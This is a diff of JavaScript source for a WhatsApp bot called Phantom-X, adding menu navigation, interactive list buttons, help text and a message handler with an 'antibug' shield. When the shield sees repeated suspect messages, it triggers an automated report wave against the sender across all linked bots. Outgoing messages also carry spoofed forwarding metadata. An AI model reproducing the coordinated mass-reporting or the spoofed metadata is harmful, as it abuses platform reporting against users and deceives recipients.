+            `   ✅ *Confirmed — buttons are WORKING!*\n\n` +
+            `   The list-select format renders\n` +
+            `   correctly on your WhatsApp.\n\n` +
+            `   Type *.menu* to open the full menu.`
+        )}, { quoted: msg });
+        return;
+    }
+    if (buttonId === "test_menu") {
+        await sendPersonaMenuNav(sock, jid, msg, isDev, sock.user?.id || "");
+        return;
+    }
+    if (buttonId === "menu_owner") {
+        const sec = tree.owner;
+        const body = buildOmegaTerminal(
+            `   ╔══ *🔑 OWNER MENU* ══╗\n\n` +
+            `   " *the sovereign does not ask.*\n     *the sovereign commands.* "\n\n` +
+            `   select your arsenal below :`
+        );
+        const rows = Object.entries(sec.sections).map(([k, s]) => ({ id: `owner_${k}`, title: s.title, desc: s.blurb }));
+        await sendListSelect(sock, jid, msg, body, "⚡ ENTER THE DOMAIN", rows);
+        return;
+    }
+    if (buttonId === "menu_group") {
+        const sec = tree.group;
+        const body = buildOmegaTerminal(
+            `   ╔══ *🛡 GROUP MENU* ══╗\n\n` +
+            `   " *every group is a kingdom.*\n     *you decide how it is ruled.* "\n\n` +
+            `   select your section below :`
+        );
+        const rows = Object.entries(sec.sections).map(([k, s]) => ({ id: `group_${k}`, title: s.title, desc: s.blurb }));
+        await sendListSelect(sock, jid, msg, body, "🛡 ENTER THE CITADEL", rows);
+        return;
+    }
+    if (buttonId === "menu_bug") {
+        await sendInteractiveButtons(sock, jid, msg,
+            buildOmegaTerminal(
+                `   ╔══ *🐞 BUG / SHIELD MENU* ══╗\n\n` +
+                `   Safe security tools for reports, shields,\n` +
+                `   status checks and threat review.\n\n` +
+                `   • *.antibug on/off/status*\n` +
+                `   • *.bugshield*\n` +
+                `   • *.report <number> [note]*\n` +
+                `   • *.scan <number>*\n` +
+                `   • *.threats*\n` +
+                `   • *.threatinfo <number>*\n\n` +
+                `   _Use this menu for defensive/testing reports._`
+            ),
+            [
+                { id: "bug_antibug", label: "🛡 AntiBug Status" },
+                { id: "bug_report",  label: "🐞 Report Bug" },
+                { id: "back_to_main", label: "🏠 Main Menu" },
+            ]
+        );
+        return;
+    }
+    if (buttonId === "menu_fun") {
+        await sendInteractiveButtons(sock, jid, msg,
+            buildOmegaTerminal(
+                `   ╔══ *🎮 FUN MENU* ══╗\n\n` +
+                `   • *.joke*\n` +
+                `   • *.fact*\n` +
+                `   • *.quote*\n` +
+                `   • *.truth* / *.dare*\n` +
+                `   • *.rps rock/paper/scissors*\n` +
+                `   • *.8ball <question>*\n` +
+                `   • *.slots*\n` +
+                `   • *.trivia*\n` +
+                `   • *.ttt @user*\n` +
+                `   • *.roast @user*\n` +
+                `   • *.ship @user1 @user2*\n\n` +
+                `   _Type any command above to play._`
+            ),
+            [
+                { id: "fun_games", label: "🎲 Games" },
+                { id: "fun_social", label: "😂 Social Fun" },
+                { id: "back_to_main", label: "🏠 Main Menu" },
+            ]
+        );
+        return;
+    }
+    if (buttonId === "bug_antibug") {
+        await sock.sendMessage(jid, { text: buildOmegaTerminal(`   🛡 *ANTIBUG STATUS*\n\n   Use: *.antibug status*\n   Enable: *.antibug on*\n   Disable: *.antibug off*`) }, { quoted: msg });
+        return;
+    }
+    if (buttonId === "bug_report") {
+        await sock.sendMessage(jid, { text: buildOmegaTerminal(`   🐞 *REPORT BUG*\n\n   Use this format:\n   *.report <number> <short note>*\n\n   Example:\n   *.report 2348012345678 suspicious payload test*`) }, { quoted: msg });
+        return;
+    }
+    if (buttonId === "fun_games") {
+        await sock.sendMessage(jid, { text: buildOmegaTerminal(`   🎲 *GAMES*\n\n   • *.truth*\n   • *.dare*\n   • *.rps rock*\n   • *.8ball will I pass?*\n   • *.slots*\n   • *.trivia*\n   • *.hangman*\n   • *.numguess*\n   • *.mathquiz*`) }, { quoted: msg });
+        return;
+    }
+    if (buttonId === "fun_social") {
+        await sock.sendMessage(jid, { text: buildOmegaTerminal(`   😂 *SOCIAL FUN*\n\n   • *.joke*\n   • *.fact*\n   • *.quote*\n   • *.roast @user*\n   • *.compliment @user*\n   • *.ship @user1 @user2*\n   • *.rate @user*\n   • *.vibe @user*`) }, { quoted: msg });
+        return;
+    }
+    if (buttonId === "menu_dev") {
+        if (!isDev) {
+            await sock.sendMessage(jid, { text: buildOmegaTerminal(`   🔒  *ACCESS_DENIED*\n\n   the throne does not open\n   for the uninvited.`) }, { quoted: msg });
+            return;
+        }
+        const sec = tree.dev;
+        const body = buildOmegaTerminal(
+            `   ╔══ *🔴 DEV MENU* ══╗\n\n` +
+            `   " *only the architect may*\n     *enter this chamber.* "\n\n` +
+            `   the void acknowledges you.\n` +
+            `   select your section :`
+        );
+        const rows = Object.entries(sec.sections).map(([k, s]) => ({ id: `dev_${k}`, title: s.title, desc: s.blurb }));
+        await sendListSelect(sock, jid, msg, body, "🔴 ENTER THE THRONE", rows);
+        return;
+    }
+
+    // Sub-section: owner_nexus, group_citadel, dev_oversight, etc.
+    const sepIdx = buttonId.indexOf("_");
+    if (sepIdx === -1) return;
+    const topKey = buttonId.slice(0, sepIdx);
+    const subKey = buttonId.slice(sepIdx + 1);
+    const topSec = tree[topKey];
+    if (!topSec) return;
+    const subSec = topSec.sections[subKey];
+    if (!subSec) return;
+
+    const cmdBlock = subSec.cmds.map(c => `   • *${c}*`).join("\n");
+    const body = "eventide dev\n\n" + buildOmegaTerminal(
+        `   ╔══ *${subSec.title}* ══╗\n\n` +
+        `   _${subSec.blurb}_\n\n` +
+        `${cmdBlock}`
+    );
+    // Use sendListSelect (same proto path as stages 1 & 2) for guaranteed rendering.
+    // nativeFlowMessage buttons are invisible on many WA clients.
+    await sendListSelect(sock, jid, msg, body, "◀ NAVIGATE", [
+        { id: `menu_${topKey}`, title: `◀ Back to ${topSec.title}`, desc: "return to previous menu" },
+        { id: "back_to_main",   title: "🌑 Main Menu",               desc: "return to main navigation" },
+    ]);
+}
+
+// Re-sends the final menu list (used by back_to_main)
+async function sendPersonaMenuNav(sock, from, msg, isDev, botJid) {
+    const persona  = getBotPersona(botJid);
+    const scenes   = getPersonaScenes(persona);
+    const finalText = scenes.main(isDev);
+    const topRows = [
+        { id: "menu_owner", title: "👑 OWNER MENU", desc: "commands for the sovereign" },
+        { id: "menu_bug",   title: "🐞 BUG MENU",   desc: "bug reports, shields & threat tools" },
+        { id: "menu_group", title: "👥 GROUP MENU", desc: "group management & protection" },
+        { id: "menu_fun",   title: "🎮 FUN MENU",   desc: "games, jokes & entertainment" },
+    ];
+    if (isDev) topRows.push({ id: "menu_dev", title: "🔴 DEV MENU", desc: "the silent throne — dev only" });
+    await sendListSelect(
+        sock,
+        from,
+        msg,
+        "🌑 *Tap the button below to open the Phantom-X menu sections:*",
+        "🌑 ⟢ NAVIGATE THE VOID ⟣ 🌑",
+        topRows
+    );
+}
+
+// Sends a tap-able single-select picker (list-style button popup).
+//
+// Uses @whiskeysockets/baileys's `interactiveButtons` API which (unlike vanilla
+// @whiskeysockets/baileys) emits the `biz` + `interactive` + `native_flow`
+// binary node wrappers WhatsApp's server requires. Without those wrappers the
+// server silently strips the button payload — that's why vanilla Baileys bots
+// can "send" buttons but no one ever sees them.
+//
+// The tap-response handler already decodes interactiveResponseMessage →
+// nativeFlowResponseMessage → paramsJson.id, so existing button IDs (test_ok,
+// menu_owner, sess_a, etc.) keep working with no extra changes.
+async function sendNativeFlowInteractive(sock, jid, quotedMsg, bodyText, footerText, nativeButtons) {
+    // Send raw interactiveMessage WITHOUT viewOnceMessage wrapper
+    // viewOnceMessage causes silent drops on WhatsApp Business clients
+    const msg = generateWAMessageFromContent(jid, {
+        interactiveMessage: waProto.Message.InteractiveMessage.create({
+            body: waProto.Message.InteractiveMessage.Body.create({
+                text: bodyText || "",
+            }),
+            footer: waProto.Message.InteractiveMessage.Footer.create({
+                text: footerText || "— Phantom-X",
+            }),
+            header: waProto.Message.InteractiveMessage.Header.create({
+                title: "",
+                subtitle: "",
+                hasMediaAttachment: false,
+            }),
+            nativeFlowMessage: waProto.Message.InteractiveMessage.NativeFlowMessage.create({
+                buttons: nativeButtons,
+            }),
+            contextInfo: {
+                mentionedJid: [jid],
+                forwardingScore: 999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: '120363294314781442@newsletter',
+                    newsletterName: 'Eventide Omega',
+                    serverMessageId: -1
+                }
+            }
+        })
+    }, {
+        userJid: sock.user?.id,
+        quoted: quotedMsg || undefined,
+    });
+
+    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
+}
+
+
+async function sendRawSingleSelectVariant(sock, jid, quotedMsg, bodyText, footerText, rows, mode = 'none') {
+    const interactiveMessage = waProto.Message.InteractiveMessage.create({
+        body: waProto.Message.InteractiveMessage.Body.create({ text: bodyText || '' }),
+        footer: waProto.Message.InteractiveMessage.Footer.create({ text: footerText || '— Phantom-X' }),
+        header: waProto.Message.InteractiveMessage.Header.create({
+            title: '',
+            subtitle: '',
+            hasMediaAttachment: false,
+        }),
+        nativeFlowMessage: waProto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [{
+                name: 'single_select',
+                buttonParamsJson: JSON.stringify({
+                    title: 'Open List',
+                    sections: [{
+                        title: 'Choose One',
+                        rows: rows.map(r => ({ title: r.title, description: r.desc || '', id: r.id }))
+                    }]
+                })
+            }],
+        }),
+    });
+
+    let payload;
+    if (mode === 'viewOnce') {
+        payload = {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadataVersion: 2,
+                        deviceListMetadata: {},
+                    },
+                    interactiveMessage,
+                },
+            },
+        };
+    } else if (mode === 'viewOnceV2') {
+        payload = {
+            viewOnceMessageV2: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadataVersion: 2,
+                        deviceListMetadata: {},
+                    },
+                    interactiveMessage,
+                },
+            },
+        };
+    } else {
+        payload = { interactiveMessage };
+    }
+
+    const msg = generateWAMessageFromContent(jid, payload, {
+        userJid: sock.user?.id,
+        quoted: quotedMsg || undefined,
+    });
+
+    const additionalNodes = [{
+        tag: 'biz',
+        attrs: {},
+        content: [{
+            tag: 'interactive',
+            attrs: { type: 'native_flow', v: '1' },
+            content: [{ tag: 'native_flow', attrs: { v: '9', name: 'mixed' } }],
+        }],
+    }];
+    if (!String(jid || '').endsWith('@g.us')) {
+        additionalNodes.push({ tag: 'bot', attrs: { biz_bot: '1' } });
+    }
+
+    await sock.relayMessage(jid, msg.message, {
+        messageId: msg.key.id,
+        useCachedGroupMetadata: true,
+        additionalNodes,
+    });
+}
+
+function extractNativeFlowButtonId(paramsJson) {
+    const raw = typeof paramsJson === "string" ? paramsJson : JSON.stringify(paramsJson || {});
+    try {
+        const parsed = typeof paramsJson === "string" ? JSON.parse(paramsJson || "{}") : (paramsJson || {});
+        return parsed?.id ||
+            parsed?.selectedId ||
+            parsed?.selected_id ||
+            parsed?.selectedRowId ||
+            parsed?.selected_row_id ||
+            parsed?.rowId ||
+            parsed?.row_id ||
+            parsed?.buttonId ||
+            parsed?.button_id ||
+            parsed?.singleSelectReply?.selectedRowId ||
+            parsed?.selection?.id ||
+            parsed?.selectedOption?.id ||
+            "";
+    } catch (_) {
+        const m = raw.match(/"(?:id|selectedId|selected_id|selectedRowId|selected_row_id|rowId|row_id|buttonId|button_id)"\s*:\s*"([^\"]+)"/);
+        return m ? m[1] : "";
+    }
+}
+
+
+function unwrapMessageContent(message) {
+    let m = message;
+    let safety = 0;
+    while (m && safety++ < 10) {
+        const t = getContentType(m);
+        if (!t) break;
+        if (t === "ephemeralMessage") {
+            m = m.ephemeralMessage?.message;
+            continue;
+        }
+        if (t === "viewOnceMessage") {
+            m = m.viewOnceMessage?.message;
+            continue;
+        }
+        if (t === "viewOnceMessageV2") {
+            m = m.viewOnceMessageV2?.message;
+            continue;
+        }
+        if (t === "viewOnceMessageV2Extension") {
+            m = m.viewOnceMessageV2Extension?.message;
+            continue;
+        }
+        if (t === "documentWithCaptionMessage") {
+            m = m.documentWithCaptionMessage?.message || m.documentWithCaptionMessage;
+            continue;
+        }
+        if (t === "editedMessage") {
+            m = m.editedMessage?.message || m.editedMessage;
+            continue;
+        }
+        break;
+    }
+    return m || message;
+}
+
+async function sendListSelect(sock, jid, quotedMsg, bodyText, buttonLabel, rows) {
+    // Whiskey + helper package path.
+    // Flow: stage 3 menu art is already edited in-place by the caller, then we send a NEW
+    // message with one tappable button that opens a list picker.
+    if (!global.menuStateMap) global.menuStateMap = {};
+    global.menuStateMap[jid] = rows.map(r => r.id);
+
+    const singleSelect = {
+        name: 'single_select',
+        buttonParamsJson: JSON.stringify({
+            title: buttonLabel || 'Tap to Select',
+            sections: [{
+                title: 'Available Options',
+                rows: rows.map(r => ({
+                    title: r.title,
+                    description: r.desc || '',
+                    id: r.id,
+                })),
+            }],
+        }),
+    };
+
+    // ONLY interactive attempt we want: helper package wrapper for Whiskey.
+    try {
+        await helperSendInteractiveMessage(sock, jid, {
+            text: bodyText,
+            footer: '— Phantom-X',
+            interactiveButtons: [singleSelect],
+        }, quotedMsg ? { quoted: quotedMsg } : {});
+        await emitButtonTrace(sock, 'menu-send', { test: 'menu-single-select', reason: 'helper single_select sent', body: bodyText });
+        return;
+    } catch (err) {
+        console.error('[sendListSelect] helper single_select failed:', err?.message || err);
+        await emitButtonTrace(sock, 'menu-send-fail', { test: 'menu-single-select', reason: String(err?.message || err), body: bodyText });
+    }
+
+    // Final fallback: plain numbered text only.
+    const numbered = rows.map((r, i) => `*${i + 1}.* ${r.title}${r.desc ? ` — ${r.desc}` : ''}`).join('\n');
+    await sock.sendMessage(jid, {
+        text: `${bodyText}\n\n${numbered}\n\n_Reply with the number to choose._`
+    }, quotedMsg ? { quoted: quotedMsg } : {});
+}
+async function sendQuickButtons(sock, jid, quotedMsg, bodyText, buttons, footer = "— Phantom-X") {
+    try {
+        await helperSendButtons(sock, jid, {
+            text: bodyText,
+            footer,
+            buttons: buttons.map(b => ({ id: b.id, text: b.label })),
+        }, quotedMsg ? { quoted: quotedMsg } : {});
+        await emitButtonTrace(sock, 'quick-send', { test: 'quick-buttons', reason: 'helper quick buttons sent', body: bodyText });
+        return;
+    } catch (err) {
+        console.error('[sendQuickButtons] helper sendButtons failed:', err?.message || err);
+        await emitButtonTrace(sock, 'quick-send-fail', { test: 'quick-buttons', reason: String(err?.message || err), body: bodyText });
+    }
+
+    const numbered = buttons.map((b, i) => `*${i + 1}.* ${b.label}`).join("\n");
+    await sock.sendMessage(jid,
+        { text: bodyText + "\n\n" + numbered + "\n\n_Reply with the number to choose._" },
+        quotedMsg ? { quoted: quotedMsg } : {}
+    );
+}
+async function replyBadOnOff(sock, from, msg, cmdName) {
+    const body = buildOmegaTerminal(
+        `   ⚠️  *INVALID_ARG*\n` +
+        `   ━━━━━━━━━━━━━━━\n\n` +
+        `   ╔╦══ COMMAND  ──╼  *${cmdName}*\n` +
+        `   ╚╩══ EXPECTED ──╼  *on* or *off*\n\n` +
+        `   _Select the correct option below._`
+    );
+    await sendListSelect(sock, from, msg, body, "⚡ CHOOSE", [
+        { id: `onoff_${cmdName}_on`,  title: `✅ ${cmdName} on`,  desc: "enable this feature"  },
+        { id: `onoff_${cmdName}_off`, title: `❌ ${cmdName} off`, desc: "disable this feature" },
+    ]);
+}
+
+function buildMenuText(mode, themeNum, isDev) {
+    const time = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos" });
+    const modeLabel = (mode || "public") === "owner" ? "👤 Owner Only" : "🌍 Public";
+    const uptime = formatUptime();
+    const n = Number(themeNum) || 1;
+    const S = isDev === undefined ? getMenuSections() : getVisibleSections(isDev);
+    const ml = modeLabel;
+    const up = uptime;
+    let text;
+    if (n === 2)  text = buildThemeMatrix(ml, time, up, S);
+    else if (n === 3)  text = buildThemeRoyal(ml, time, up, S);
+    else if (n === 4)  text = buildThemeInferno(ml, time, up, S);
+    else if (n === 5)  text = buildThemeMinimal(ml, time, up, S);
+    else if (n === 6)  text = buildThemeVoid(ml, time, up, S);
+    else if (n === 7)  text = buildThemeVaporwave(ml, time, up, S);
+    else if (n === 8)  text = buildThemeGothic(ml, time, up, S);
+    else if (n === 9)  text = buildThemeCursive(ml, time, up, S);
+    else if (n === 10) text = buildThemeCosmos(ml, time, up, S);
+    else if (n === 11) text = buildThemeSoft(ml, time, up, S);
+    else if (n === 12) text = buildThemeDiamond(ml, time, up, S);
+    else if (n === 13) text = buildThemeThunder(ml, time, up, S);
+    else if (n === 14) text = buildThemeWarrior(ml, time, up, S);
+    else if (n === 15) text = buildThemeNeon(ml, time, up, S);
+    else if (n === 16) text = buildThemeSpy(ml, time, up, S);
+    else if (n === 17) text = buildThemePirate(ml, time, up, S);
+    else if (n === 18) text = buildThemeShadow(ml, time, up, S);
+    else if (n === 19) text = buildThemeBoldTech(ml, time, up, S);
+    else if (n === 20) text = buildThemeEcho(ml, time, up, S);
+    else text = buildThemeGhost(ml, time, up, S);
+    // Developer contact footer — appended to every menu theme
+    text += `\n\n━━━━━━━━━━━━━━━━━━━━\n` +
+            `💎 *Powered by Phantom X*\n` +
+            `📲 *Developer:*  wa.me/${DEV_NUMBER}\n` +
+            `_To get premium access, message the developer._`;
+    return text;
+}
+
+// --- ANTI-SPAM CHECK ---
+function isSpamming(jid) {
+    const now = Date.now();
+    if (!spamTracker[jid]) spamTracker[jid] = { count: 0, lastTime: now };
+    const tracker = spamTracker[jid];
+    // Reset count if last message was more than 10 seconds ago
+    if (now - tracker.lastTime > 10000) {
+        tracker.count = 1;
+        tracker.lastTime = now;
+    } else {
+        tracker.count++;
+        tracker.lastTime = now;
+    }
+    // Flag as spam if more than 5 messages in 10 seconds
+    return tracker.count > 5;
+}
+
+function getStaticHelpAnswer(query) {
+    const q = String(query || "").toLowerCase().trim();
+    if (!q) return "";
+    const has = (...terms) => terms.some(t => q.includes(t));
+
+    const toggleDocs = {
+        antilink: {
+            cmd: ".antilink",
+            scope: "inside the group you want to protect",
+            note: "blocks invite/group links from non-admins and warns them",
+        },
+        antispam: {
+            cmd: ".antispam",
+            scope: "inside the group",
+            note: "warns and handles rapid spam messages",
+        },
+        antimention: {
+            cmd: ".antimention",
+            scope: "inside the group",
+            note: "blocks mass-mention spam",
+        },
+        antidemote: {
+            cmd: ".antidemote",
+            scope: "inside the group",
+            note: "protects against dangerous demotions",
+        },
+        antidelete: {
+            cmd: ".antidelete",
+            scope: "inside the group",
+            note: "reposts deleted messages when enabled",
+        },
+        antibot: {
+            cmd: ".antibot",
+            scope: "inside the group",
+            note: "removes automated/newsletter-style accounts when possible",
+        },
+        welcome: {
+            cmd: ".welcome",
+            scope: "inside the group",
+            note: "sends a welcome message when people join",
+        },
+        goodbye: {
+            cmd: ".goodbye",
+            scope: "inside the group",
+            note: "sends a goodbye message when people leave",
+        },
+    };
+
+    for (const [key, info] of Object.entries(toggleDocs)) {
+        if (has(key)) {
+            return (
+                `*${info.cmd} help*\n\n` +
+                `To turn it *on*: *${info.cmd} on*\n` +
+                `To turn it *off*: *${info.cmd} off*\n\n` +
+                `Run it *${info.scope}*.\n` +
+                `What it does: ${info.note}.\n\n` +
+                `_Example:_ *${info.cmd} on*`
+            );
+        }
+    }
+
+    if (has("antibug", "bugshield", "shield")) {
+        return (
+            `*Antibug / Shield help*\n\n` +
+            `Turn on: *.antibug on*\n` +
+            `Turn off: *.antibug off*\n` +
+            `Check status: *.antibug status*\n\n` +
+            `This one is for the *linked bot number itself*, not just one group.`
+        );
+    }
+
+    if (has("broadcast")) {
+        return (
+            `*Broadcast help*\n\n` +
+            `Start: *.broadcast <minutes> <message>*\n` +
+            `Stop: *.stopbroadcast*\n\n` +
+            `_Example:_ *.broadcast 10 Hello everyone*`
+        );
+    }
+
+    if (has("schedule")) {
+        return (
+            `*Schedule help*\n\n` +
+            `Set: *.schedule HH:MM <message>*\n` +
+            `View: *.schedules*\n` +
+            `Remove: *.unschedule HH:MM*\n\n` +
+            `_Example:_ *.schedule 08:00 Good morning everyone*`
+        );
+    }
+
+    if (has("mute", "lock group") && !has("unmute")) {
+        return `*Mute group*\n\nUse *.mute* inside the group to make it admins-only.\nUse *.unmute* to open it again.`;
+    }
+
+    if (has("unmute", "unlock group")) {
+        return `*Unmute group*\n\nUse *.unmute* inside the group to allow everyone chat again.\nUse *.mute* to lock it back.`;
+    }
+
+    if (has("promote")) {
+        return `*Promote help*\n\nUse *.promote @user* inside the group to make someone an admin.`;
+    }
+
+    if (has("demote")) {
+        return `*Demote help*\n\nUse *.demote @user* inside the group to remove admin from someone.`;
+    }
+
+    if (has("kick", "remove member")) {
+        return `*Kick help*\n\nUse *.kick @user* inside the group to remove someone.`;
+    }
+
+    if (has("warn")) {
+        return `*Warn help*\n\nUse *.warn @user* to warn someone.\nSee all warns: *.warnlist*\nClear warns: *.resetwarn @user*`;
+    }
+
+    if (has("group id", "groupid")) {
+        return `*Group ID help*\n\nUse *.groupid* inside a group to see that group's ID.\nIf you run it outside a group, it shows cached groups.`;
+    }
+
+    if (has("menu", "commands")) {
+        return `*Menu help*\n\nType *.menu* to open the main menu.\nYou can also use *.chains*, *.codex*, *.ascend*, *.flare*, or *.abyss* directly.`;
+    }
+
+    return "";
+}
+
+// --- MESSAGE HANDLER ---
+async function handleMessage(sock, msg) {
+    try {
+        if (!msg.message) return;
+
+        const from = msg.key.remoteJid;
+        const isGroup = from.endsWith("@g.us");
+        // Detect self-chat: check if the 'from' JID belongs to the bot's own number
+        const ownNumber = (sock.user?.id || "").split(':')[0].split('@')[0];
+        const fromNumber = from.split(':')[0].split('@')[0];
+        const isSelfChat = !isGroup && (msg.key.fromMe || fromNumber === ownNumber);
+
+        // Skip non-message types cleanly
+        if (from === "status@broadcast") return;
+
+        const content = unwrapMessageContent(msg.message);
+        const type = getContentType(content);
+        const rawBody =
+            (type === "conversation" && content.conversation) ||
+            (type === "extendedTextMessage" && content.extendedTextMessage?.text) ||
+            (type === "imageMessage" && content.imageMessage?.caption) ||
+            (type === "videoMessage" && content.videoMessage?.caption) ||
+            (type === "documentMessage" && content.documentMessage?.caption) ||
+            (type === "contactMessage" && content.contactMessage?.displayName) ||
+            (type === "contactsArrayMessage" && content.contactsArrayMessage?.contacts?.map(c => c.displayName).join(" ")) ||
+            (type === "locationMessage" && content.locationMessage?.name) ||
+            (type === "liveLocationMessage" && content.liveLocationMessage?.caption) ||
+            (type === "buttonsMessage" && content.buttonsMessage?.contentText) ||
+            (type === "templateMessage" && (content.templateMessage?.hydratedTemplate?.hydratedContentText || content.templateMessage?.fourRowTemplate?.bodyText)) ||
+            (type === "listMessage" && content.listMessage?.description) ||
+            (type === "buttonsResponseMessage" && content.buttonsResponseMessage?.selectedDisplayText) ||
+            (type === "listResponseMessage" && (content.listResponseMessage?.title || content.listResponseMessage?.singleSelectReply?.selectedRowId || "")) ||
+            (type === "interactiveResponseMessage" && (extractNativeFlowButtonId(content.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || "") || content.interactiveResponseMessage?.body?.text || "")) ||
+            (type === "templateButtonReplyMessage" && content.templateButtonReplyMessage?.selectedId) ||
+            "";
+
+        // ID of tapped button or list row — empty string if message is not a tap/button response
+        let buttonId = (() => {
+            if (type === "interactiveResponseMessage") {
+                return extractNativeFlowButtonId(content.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || "");
+            }
+            if (type === "listResponseMessage") return content.listResponseMessage?.singleSelectReply?.selectedRowId || "";
+            if (type === "buttonsResponseMessage") return content.buttonsResponseMessage?.selectedButtonId || "";
+            if (type === "templateButtonReplyMessage") return content.templateButtonReplyMessage?.selectedId || "";
+            return "";
+        })();
+
+        // Fallback for list/button UIs that render as plain numbered text instead of a tap-able
+        // component. If the user replies with "1", "2", etc., convert that into the stored row id.
+        if (!buttonId && global.menuStateMap && global.menuStateMap[from] && /^\d+$/.test(String(rawBody || "").trim())) {
+            const idx = parseInt(String(rawBody).trim(), 10) - 1;
+            const arr = global.menuStateMap[from] || [];
+            if (idx >= 0 && idx < arr.length) {
+                buttonId = arr[idx];
+                delete global.menuStateMap[from];
+            }
+        }
+
+        const senderJid = isGroup
+            ? msg.key.participant || msg.participant
+            : from;
+
+        // Normalise owner-sent messages in groups. On some MD setups, commands sent
+        // by the linked owner's primary phone arrive with fromMe=false and sometimes
+        // only expose LID/phone variants in different fields. If we don't fix that,
+        // owner mode + early group gating will silently ignore valid dot-commands.
+        const senderJidVariants = getSenderJids(msg);
+        if (senderJid && !senderJidVariants.includes(senderJid)) senderJidVariants.unshift(senderJid);
+        const botOwnerJidVariants = [];
+        if (sock.user?.id) botOwnerJidVariants.push(sock.user.id);
+        if (sock.user?.lid) botOwnerJidVariants.push(sock.user.lid);
+        if (ownNumber) botOwnerJidVariants.push(`${ownNumber}@s.whatsapp.net`);
+        const linkedSession = getSessionForSocket(sock);
+        const linkedOwnerNumber = normalizeNum(linkedSession?.phoneNumber || ownNumber);
+        const isBotOwnerSender = msg.key.fromMe || isSelfChat || senderJidVariants.some(sj =>
+            botOwnerJidVariants.some(bj => sj === bj || isSameUser(sj, bj))
+        ) || (linkedOwnerNumber && senderJidVariants.some(sj => normalizeNum(jidLocal(sj)) === linkedOwnerNumber));
+        if (isBotOwnerSender && !msg.key.fromMe) msg.key.fromMe = true;
+
+        if (DEBUG_RUNTIME && isGroup && rawBody && /^[.,?]/.test(String(rawBody).trimStart())) {
+            debugLog(`[GroupCmd] candidate from=${from} sender=${senderJid || "?"} type=${type} fromMe=${!!msg.key.fromMe} self=${!!isSelfChat} body=${String(rawBody).trim().slice(0, 120)}`);
+        }
+        if (isGroup && rawBody && /^[.,?]/.test(String(rawBody).trimStart())) {
+            await emitGroupTrace(sock, 'handle-enter', {
+                eventType: type,
+                jid: from,
+                sender: senderJid || from,
+                fromMe: msg.key.fromMe,
+                rawBody,
+                reason: 'entered handleMessage',
+            });
+        }
+
+        const reply = (text) => sock.sendMessage(from, { text }, { quoted: msg });
+        const replyImg = async (imageUrl, caption) => {
+            const buf = await fetchBuffer(imageUrl);
+            await sock.sendMessage(from, { image: buf, caption }, { quoted: msg });
+        };
+
+        const botJid = sock.user?.id || null;
+        const currentMode = getBotMode(botJid);
+
+        if (getBotSecurity(botJid, "antibug") && !msg.key.fromMe && isSuspiciousBugPayload(rawBody)) {
+            try { await sock.sendMessage(from, { delete: msg.key }); } catch (_) {}
+            const reasons = getBugPayloadReasons(rawBody);
+            console.log(`[AntiBug] Blocked payload from ${senderJid} in ${from} (${reasons.join(", ")})`);
+            try {
+                const senderNumOnly = normalizeNum(senderJid.split("@")[0].split(":")[0]);
+                const hits = recordAntibugHit(senderJid);
+                if (hits >= 3) {
+                    addThreat(senderNumOnly, botJid, "spam", `Auto: ${hits} antibug hits in 30m (${reasons.join(", ")})`);
+                    recordThreatBotAction(senderNumOnly, botJid, "trigger");
+                    runReportWaveAcrossAllBots(senderNumOnly, "spam", { staggerSec: 10 }).catch(() => {});
+                } else if (isThreatJid(senderJid)) {
+                    recordThreatBotAction(senderNumOnly, botJid, "trigger");
+                }
+            } catch (e) { console.log(`[AntiBug] threat-net hookup err: ${e?.message}`); }
+            // DM notify the owner
+            try {
+                const ownerJid = (botJid || "").replace(/:.*@/, "@").replace(/@g\.us/, "@s.whatsapp.net");
+                const senderNum = senderJid.split("@")[0];
+                await sock.sendMessage(ownerJid, {
+                    text:
+                        `🛡️ *Shield Alert*\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                        `⚠️ Incoming threat detected & neutralised\n\n` +
+                        `📱 *Sender:*  +${senderNum}\n` +
+                        `📍 *Location:*  ${isGroup ? "Group" : "Direct message"}\n` +
+                        `🕐 *Time:*  ${new Date().toLocaleTimeString("en-NG", { timeZone: "Africa/Lagos" })}\n\n` +
+                        `_Payload deleted before it rendered. You are protected._`
+                });
+            } catch (_) {}
+            return;
+        }
+
+        // --- SILENCE CHECK — dev can mute a number from any specific bot ---
+        if (!msg.key.fromMe && !isDevJid(senderJid) && isSilenced(botJid, senderJid)) return;
+
+        // --- AI HELP MODE interceptor ---
+        {
+            const helpKey = `${senderJid}::${from}`;
+            if (helpModeUsers[helpKey] && rawBody && !rawBody.startsWith(".")) {
+                clearTimeout(helpModeUsers[helpKey].timer);
+                helpModeUsers[helpKey].timer = setTimeout(async () => {
+                    delete helpModeUsers[helpKey];
+                    try { await sock.sendMessage(from, { text: buildOmegaTerminal(`   ⏳  Help mode timed out after 10 min inactivity.\n   Type *.help* again to re-enable.`) }); } catch {}
+                }, 10 * 60 * 1000);
+                const helpSystem =
+                    `You are Phantom X, an AI customer care assistant for the Eclipse/Phantom-X WhatsApp bot.\n` +
+                    `RULES:\n` +
+                    `1. If the user's message contains a typo or close approximation of a command (e.g. "antilinnk", "broad cast", "promot", "getpp", "kickk"), recognise their intent, gently note the correct spelling, then answer fully.\n` +
+                    `2. Be friendly, conversational, and concise. Use WhatsApp *bold* and _italic_.\n` +
+                    `3. Always show the exact command syntax.\n` +
+                    `4. If you're unsure, say so honestly.\n\n` +
+                    `FULL COMMAND LIST:\n` +
+                    `.menu — main menu\n` +
+                    `.ai / .ask <q> — ask AI\n` +
+                    `.ping — bot latency\n` +
+                    `.uptime — how long bot has been online\n` +
+                    `.add <number> — add member to group\n` +
+                    `.kick @user — remove member\n` +
+                    `.promote @user — make admin\n` +
+                    `.demote @user — remove admin\n` +
+                    `.ban @user — ban member\n` +
+                    `.unban @user — unban member\n` +
+                    `.warn @user — issue warning (3 = auto kick)\n` +
+                    `.warnlist — see all warnings\n` +
+                    `.resetwarn @user — clear warnings\n` +
+                    `.antilink on/off — block invite links from non-admins\n` +
+                    `.antispam on/off — block spam messages\n` +
+                    `.antimention on/off — block mass mentions\n` +
+                    `.antidemote on/off — stop non-owners demoting the bot\n` +
+                    `.lock / .unlock — group announcement mode\n` +
